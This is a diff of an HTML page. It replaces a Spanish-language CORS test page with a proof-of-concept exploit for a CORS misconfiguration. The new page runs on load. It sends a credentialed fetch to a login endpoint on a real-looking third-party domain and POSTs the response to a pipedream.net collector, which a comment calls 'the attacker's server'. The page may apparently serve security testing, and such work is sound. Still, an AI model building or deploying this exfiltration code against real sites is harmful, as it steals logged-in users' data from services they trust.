@@ -1,48 +1,24 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Explotación CORS con OPTIONS</title>
-  </head>
-  <body>
-    <center>
-      <h2>Explotación CORS con OPTIONS</h2>
-      <h3>Prueba la configuración CORS</h3>
-      <div id="demo">
-        <button type="button" onclick="exploitOptions()">Ejecutar Exploit</button>
-      </div>
-    </center>
-
-    <script>
-      function exploitOptions() {
-        var xhr = new XMLHttpRequest();
-        xhr.onreadystatechange = function() {
-          if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-              document.getElementById("demo").innerHTML = "Respuesta:<br>" + xhr.responseText;
-            } else {
-              document.getElementById("demo").innerHTML = "Error: " + xhr.status + " - " + xhr.statusText;
-            }
-            // Mostrar en consola algunos de los encabezados de CORS
-            console.log("Access-Control-Allow-Origin:", xhr.getResponseHeader("Access-Control-Allow-Origin"));
-            console.log("Access-Control-Allow-Methods:", xhr.getResponseHeader("Access-Control-Allow-Methods"));
-            console.log("Access-Control-Allow-Headers:", xhr.getResponseHeader("Access-Control-Allow-Headers"));
-          }
-        };
-
-        xhr.onerror = function() {
-          console.error("Error de red o problema CORS");
-        };
-
-        // Se envía una solicitud OPTIONS a la URL vulnerable
-        xhr.open(
-          "GET",
-          "https://api-docs.vimla.se/",
-          true
-        );
-
-        xhr.send();
-      }
-    </script>
-  </body>
+<head>
+  <title>CORS Exploit</title>
+</head>
+<body>
+  <h1>Exploiting CORS Misconfiguration</h1>
+  <script>
+    fetch("https://qlik.vizlib.telenor.se/vmc/login", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log("Sensitive Data:", data); 
+      // Send the data to the attacker's server
+      fetch("https://eoxyav7zza3d29g.m.pipedream.net/", {
+        method: "POST",
+        body: data
+      });
+    });
+  </script>
+</body>
 </html>
